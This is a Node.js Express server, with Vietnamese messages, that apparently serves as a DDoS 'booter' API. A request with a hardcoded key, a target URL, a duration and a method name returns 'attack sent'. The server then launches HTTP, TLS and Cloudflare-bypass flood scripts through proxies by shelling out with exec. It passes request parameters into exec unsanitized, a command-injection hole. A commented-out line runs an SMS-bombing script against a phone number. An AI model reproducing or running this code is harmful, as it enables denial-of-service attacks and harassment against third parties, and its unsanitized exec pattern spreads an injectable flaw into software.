const express = require('express');
const app = express();
const port = 3000;
var exec = require('child_process').exec

app.get('/', (req, res) => {
  const key = req.query.key;  
  const url = req.query.url;
  const time = req.query.time;
  const method = req.query.method;
if (!key || !url || !time || !method) {
    const err_u = {
        message: `sai url`,
        code: '400'
    }
    res.status(400).send(err_u);
  } else {
  if (key === '1234') {
    if (url) {
            if (time <= 60) {
                if (method === 'HTTP' ||method === 'TLS' ||method === 'TLSBYPASS' ||method === 'CF-TLS'||method === 'HTTP-RAW' ||method === 'HTTP-LOAD') {
                    const jsonData = {
                        message: `attack sent`,
                        url: `${url}`,
                        time: `${time}`,
                        method: `${method}`,
                        code: '200'
                    };
                    res.status(200).send(jsonData);
                    if (method === 'HTTP') {
                        exec(`node HTTP.js ${url} ${time} 1000 1000 proxy.txt`, (error, stdout, stderr) => {  
                        console.log('http is running');
                    });
                    }
                    if (method === 'HTTP-RAW') {
                        exec(`node HTTP.js ${url} ${time} 1000 1000 proxy.txt`, (error, stdout, stderr) => {  
                        console.log('http-raw is running');
                    });
                    }
                    if (method === 'TLS') {
                        exec(`node TLS.js ${url} ${time} 1000 1000 proxy.txt`, (error, stdout, stderr) => {  
                        console.log('tls is running');
                    });
                    }
                    if (method === 'TLSBYPASS') {
                        exec(`node TLSBYPASS.js ${url} ${time} 1000 1000 proxy.txt`, (error, stdout, stderr) => {  
                        console.log('tlsbypass is running');
                    });
                    }
                    if (method === 'CF-TLS') {
                        exec(`node TLSCF.js ${url} ${time} 1000 1000 proxy.txt`, (error, stdout, stderr) => {  
                        console.log('http is running');
                    });
                    }
                    if (method === 'HTTP-LOAD') {
                        exec(`node HTTP-LOAD.js ${url} ${time} 1000 1000 proxy.txt`, (error, stdout, stderr) => {  
                        console.log('http-load is running');
                    });
                    }
                    /*var exec = require('child_process').exec
                        exec(`py SMS.py 0365494577 60`, (error, stdout, stderr) => {  
                        console.log('');
                    });*/
                } else {
                    const err_method = {
                        message: `sai method`,
                        code: '400'
                    }
                    res.status(400).send(err_method);
                }
            } else {
                const err_time = {
                    message: `time phải dưới 60s`,
                    code: '400'
                }
                res.status(400).send(err_time);
            }
    } else {
        const err_url = {
            message: `coi lại url thiếu`,
            code: '400'
        }
        res.status(400).send(err_url);
    }
  } else {
    const err_key = {
        message: `sai key`,
        code: '400'
    }
    res.status(400).send(err_key);
  }
}
});

app.listen(port, () => {
  console.log(`server run on port http://localhost:${port}`);
});